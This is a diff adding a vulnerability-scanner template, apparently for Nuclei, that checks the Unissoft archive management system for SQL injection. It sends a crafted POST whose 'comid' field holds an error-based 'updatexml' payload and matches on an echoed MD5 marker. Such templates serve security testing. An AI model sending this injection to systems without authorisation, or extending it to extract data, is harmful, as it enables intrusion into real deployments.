@@ -1,0 +1,31 @@
+id: unissoft-archive-selectfileremote-sqli
+
+info:
+  name: Unissoft Archive Management System SelectFileRemote - SQL Injection
+  author: qwtd
+  severity: high
+  description: Unissoft Archive Management System SelectFileRemote contains a SQL injection vulnerability.
+  reference:
+    - https://mp.weixin.qq.com/s/4Ro2Au7rwUB3IZidOHQyNw
+  tags: 紫光档案管理系统
+
+http:
+  - raw:
+      - |
+        POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */* Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        userID=admin&fondsid=1&comid=' and updatexml(1,concat(0x7e,MD5(123456),0x7e),1)=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
+      - type: status
+        status:
+          - 404
